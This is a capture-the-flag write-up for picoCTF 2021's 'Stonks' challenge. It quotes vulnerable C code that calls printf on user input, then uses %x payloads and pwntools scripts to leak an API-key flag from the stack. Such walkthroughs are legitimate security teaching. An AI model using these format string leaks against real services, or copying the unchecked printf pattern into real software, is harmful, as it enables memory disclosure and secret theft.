# Stonks

- [Challenge information](#challenge-information)
- [Solution](#solution)
- [References](#references)

## Challenge information
```
Points: 20
Tags: picoCTF 2021, Binary Expoitation
Author: MADSTACKS

Description:
I decided to try something noone else has before. I made a bot to automatically trade stonks for 
me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! vuln.c 

nc mercury.picoctf.net 16439
 
Hints:
1. Okay, maybe I'd believe you if you find my API key.
```

## Solution

### Study the source code

The `main` function of the program looks like this
```c
int main(int argc, char *argv[])
{
	setbuf(stdout, NULL);
	srand(time(NULL));
	Portfolio *p = initialize_portfolio();
	if (!p) {
		printf("Memory failure\n");
		exit(1);
	}

	int resp = 0;

	printf("Welcome back to the trading app!\n\n");
	printf("What would you like to do?\n");
	printf("1) Buy some stonks!\n");
	printf("2) View my portfolio\n");
	scanf("%d", &resp);

	if (resp == 1) {
		buy_stonks(p);
	} else if (resp == 2) {
		view_portfolio(p);
	}

	free_portfolio(p);
	printf("Goodbye!\n");

	exit(0);
}
```

Nothing much interesting there. Lets take a look at the `buy_stonks` function instead
```c
int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);

	int money = p->money;
	int shares = 0;
	Stonk *temp = NULL;
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp->next = p->head;
		p->head = temp;
		money -= shares;
	}
	printf("Stonks chosen\n");

	// TODO: Figure out how to read token from file, for now just ask

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}
```

Much more interesting. We see that the api/flag is read from file and stored in `api_buf`.

We also see that the program reads user input with the `scanf` function and later uses this input in `printf` without any format string specified, making it vulnerable to a [format string attack](https://owasp.org/www-community/attacks/Format_string_attack).
```c
<---snip--->
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);               <------ Here!
<---snip--->
```

With specially crafted input we can leak data from the stack were the flag/api is stored.

### Leak data from the stack 

Lets connect to the server and try to leak some data from the stack
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Binary_Exploitation/Stonks]
└─$ nc mercury.picoctf.net 16439
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
Buying stonks with token:
940f3b0.804b000.80489c3.f7f1fd80.ffffffff.1.940d160.f7f2d110.f7f1fdc7.0.940e180.1.940f390.940f3b0.6f636970.7b465443.306c5f49.345f7435.6d5f6c6c.306d5f79
Portfolio as of Fri Aug 11 17:23:43 UTC 2023


1 shares of ORSS
3 shares of IG
19 shares of BIPC
6 shares of JM
1192 shares of QU
729 shares of KK
Goodbye!
```

It works. We have read values from the stack and printed them as hexadecimal values with the format string specifier `%x`.  
For easier readability I have used a delimiter ('.') in this case. 

### Find the offset to the flag

But where on the stack is the flag stored? How many integers do we need to read from the stack until the flag starts?

Lets utilies [pwntools](https://docs.pwntools.com/en/stable/index.html) to automate this with a `find_offset.py` script
```python
#!/usr/bin/python

from pwn import *

SERVER = 'mercury.picoctf.net'
PORT = 16439
FLAG_START = 'pico'

# Set output level (critical, error, warning, info, debug)
context.update(log_level = "warning")
for i in range(1, 25):
    io = remote(SERVER, PORT)    
    io.sendlineafter(b"2) View my portfolio\n", b"1")
    io.sendlineafter(b"What is your API token?\n", f"%{i}$x")
    io.recvuntilS(b"Buying stonks with token:\n")
    out = io.recvline()
    try:
        # Little endian case
        res_le = p32(int(out.decode(), 16), endianness="little").decode()
        if (res_le == FLAG_START):
            print(f"Found start of flag ({FLAG_START}) with little endian at offset {i}")
        # Big endian case
        res_be = p32(int(out.decode(), 16), endianness="big").decode()
        if (res_be == FLAG_START):
            print(f"Found start of flag ({FLAG_START}) with big endian at offset {i}")
    except Exception:
        pass
    io.recvall()
    io.close()
```

Here I have used something called 'Direct Parameter Access'. With `%n$x` you can read the specified n:th integer from the stack and output it as hex.  
Since I sometimes screw up little and big endian I made sure to test both cases in the script.  
To make the output less chatty I set the log_level to `warning` (default is `info`).

Lets try the script out
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Binary_Exploitation/Stonks]
└─$ ~/python_venvs/pwntools/bin/python find_offset.py
/mnt/hgfs/CTFs/picoCTF/picoCTF_2021/Binary_Exploitation/Stonks/find_offset.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendlineafter(b"What is your API token?\n", f"%{i}$x")
Found start of flag (pico) with little endian at offset 15
```

Pwntools complains about my f-string that isn't bytes, but otherwise it works beautifully.  
The offset to the start of the flag is `15` integers on the stack.

### Get the flag

Now, lets modify the script slightly and write a new script `get_flag.py` that retrieves all the flag
```python
#!/usr/bin/python

from pwn import *

SERVER = 'mercury.picoctf.net'
PORT = 16439
offset = 15

# Set output level (critical, error, warning, info, debug)
context.update(log_level = "warning")

flag = b''
keep_going = True
while keep_going:
    io = remote(SERVER, PORT)    
    io.sendlineafter(b"2) View my portfolio\n", b"1")
    io.sendlineafter(b"What is your API token?\n", f"%{offset}$x")
    io.recvuntilS(b"Buying stonks with token:\n")
    out = io.recvline()
    try:
        res_le = p32(int(out.decode(), 16), endianness="little")
        flag += res_le
        if (b'}' in res_le):
            keep_going = False
    except Exception:
        pass
    io.recvall()
    io.close()
    offset += 1

print(flag)
```

We start retrieving data until we come upon a chuck with the `}` character in and assume this is the end of the flag.

Finally, we run the script
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2021/Binary_Exploitation/Stonks]
└─$ ~/python_venvs/pwntools/bin/python get_flag.py
/mnt/hgfs/CTFs/picoCTF/picoCTF_2021/Binary_Exploitation/Stonks/get_flag.py:17: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendlineafter(b"What is your API token?\n", f"%{offset}$x")
b'picoCTF{I_l05t_<REDACTED>}\x00\x8a\xff'
```

And there we have the flag (with some additional bytes).

For additional information, please see the references below.

### References

- [Wikipedia - Uncontrolled format string](https://en.wikipedia.org/wiki/Uncontrolled_format_string)
- [OWASP - Format string attack](https://owasp.org/www-community/attacks/Format_string_attack)
- [Exploiting Format String Vulnerabilities](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)
